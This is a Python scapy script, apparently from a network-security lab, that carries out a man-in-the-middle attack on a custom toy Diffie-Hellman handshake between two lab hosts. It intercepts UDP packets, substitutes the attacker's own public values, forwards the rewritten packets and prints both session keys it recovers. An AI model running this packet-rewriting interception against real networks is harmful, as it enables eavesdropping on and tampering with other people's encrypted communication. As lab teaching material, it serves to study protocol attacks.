#! /usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import struct
import random
from method import *
# A ----> B 发信息
# M 为中间人


# --------------------------------------------------
# 根据提示输入参数
# Machine A:
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine Server2:
IP_B = "10.0.2.7"
MAC_B = "02:42:22:3d:6a:d3"  # Server2的MAC地址即为网关192.168.60.1的MAC地址

# Machine M:
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"
# --------------------------------------------------
print("Starting MITM attack...")



# header
# magic 
MAGIC = b'DH'
# 版本号
VERSION = b'\x01'
# 质数p的字节位数
DEFAULT_KEY_BYTES_LENGTH = 2
# 默认为一个short 两个字节

# DH 协议类型
# \x01 HANDSHAKE_REQUEST
# \x02 HANDSHAKE_REPLY
# \x03 CONFIRM_SHARED
# \x04 CONFIRM_CAL
DHTYPE = [b'', b'\x01', b'\x02', b'\x03', b'\x04']



class Attacker():
    # 存储信息
    A_AUTH = b''
    B_AUTH = b''
    A_KEY = 0
    B_KEY = 0
    g = 0
    p = 0
    S = 0
    T = 0
    ya = 0
    yb = 0
    yS = 0
    yT = 0
    flag = False
    

attacker = Attacker()

# del checksum and IP len
def delete_chksum(pkt):
    del pkt[IP].len  # 删除IP长度
    del pkt[IP].chksum  # 删除IP校验和
    del pkt[UDP].chksum  # 删除TCP校验和
    del pkt.chksum  # 删除Ethernet校验和
    return pkt


def spoof_pkt(pkt):
    global attacker
    try:
        # 判断是否是本机发出的包
        if pkt.src == MAC_M:
            return
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # 判断是否是A->B的包
            pkt[Ether].src = MAC_M  # 修改源地址
            pkt[Ether].dst = MAC_B  # 修改目的地址
            data = pkt[UDP].load  # 获取原始数据
            if data[:2] == MAGIC and data[2:3] == VERSION:
                DHType = data[3:4]
                if DHType == DHTYPE[1]:
                    # 如果是HANDSHAKE_REQUEST
                    # 存储A_AUTH
                    attacker.A_AUTH = data[4:]
                elif DHType == DHTYPE[3]:
                    # 如果是CONFIRM_SHARED
                    # 获取yA
                    # attacker.ya = int.from_bytes(data[4:], DEFAULT_KEY_BYTES_LENGTH, byteorder='big')
                    attacker.ya = struct.unpack('>H', data[4:6])[0]
                    # 生成T
                    attacker.T = random.randint(1, attacker.p - 1)
                    attacker.yT = pow(attacker.g, attacker.T, attacker.p)
                    # pkt[UDP].load = MAGIC + VERSION + DHTYPE[3] + attacker.yT.to_bytes(DEFAULT_KEY_BYTES_LENGTH, byteorder='big')
                    # 发送yT
                    pkt[UDP].load = MAGIC + VERSION + DHTYPE[3] + struct.pack('>H', attacker.yT)
                else:
                    print("DHType error")
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            # 判断是否是B->A的包
            pkt[Ether].src = MAC_M  # 修改源地址
            pkt[Ether].dst = MAC_A  # 修改目的地址
            data = pkt[UDP].load  # 获取原始数据
            if data[:2] == MAGIC and data[2:3] == VERSION:
                DHType = data[3:4]
                if DHType == DHTYPE[2]:
                    # 如果是HANDSHAKE_REPLY
                    # 存储B_AUTH
                    attacker.B_AUTH = data[4+DEFAULT_KEY_BYTES_LENGTH*2:]
                    # 获取p
                    # attacker.p = int.from_bytes(data[4:4+DEFAULT_KEY_BYTES_LENGTH], byteorder = 'big')
                    attacker.p = struct.unpack('>H', data[4:6])[0]
                    # attacker.g = int.from_bytes(data[4+DEFAULT_KEY_BYTES_LENGTH:4+DEFAULT_KEY_BYTES_LENGTH*2], byteorder = 'big')
                    # 获取g
                    attacker.g = struct.unpack('>H', data[6:8])[0]
                elif DHType == DHTYPE[4]:
                    # 如果是CONFIRM_CAL
                    # attacker.yb = int.from_bytes(data[4:], DEFAULT_KEY_BYTES_LENGTH, byteorder='big')
                    # 获取yb
                    attacker.yb = struct.unpack('>H', data[4:6])[0]
                    # 生成S 
                    attacker.S = random.randint(1, attacker.p - 1)
                    attacker.yS = power(attacker.g, attacker.S, attacker.p)
                    # 发送yS
                    # pkt[UDP].load = MAGIC + VERSION + DHTYPE[4] + attacker.yS.to_bytes(DEFAULT_KEY_BYTES_LENGTH, byteorder='big')
                    pkt[UDP].load = MAGIC + VERSION + DHTYPE[4] + struct.pack('>H', attacker.yS)
                    # DH结束
                    attacker.flag = True
                else:
                    print("DHType error")
        pkt = delete_chksum(pkt)  # 删除校验和
        sendp(pkt, verbose=0)  # 发送数据
    except Exception as e:
        print(e)


if __name__ == "__main__":
    f = "host {} and host {} and udp".format(IP_A, IP_B)  # 指定抓包的目的地址与源地址
    sniff(prn=spoof_pkt, filter=f, stop_filter=lambda x: attacker.flag) # 指定抓包的回调函数和停止条件
    # Finished
    print("---------------MITM attack finished.--------------")
    attacker.A_KEY = get_key(attacker.ya, attacker.S, attacker.p)
    attacker.B_KEY = get_key(attacker.yb, attacker.T, attacker.p)
    print("A_AUTH={} B_AUTH={}".format(attacker.A_AUTH, attacker.B_AUTH))
    print("p={} g={}".format(attacker.p, attacker.g))
    print("ya={} yb={}".format(attacker.ya, attacker.yb))
    print("S={} T={}".format(attacker.S, attacker.T))
    print("yS={} yT={}".format(attacker.yS, attacker.yT))
    print("A_KEY={} B_KEY={}".format(attacker.A_KEY, attacker.B_KEY))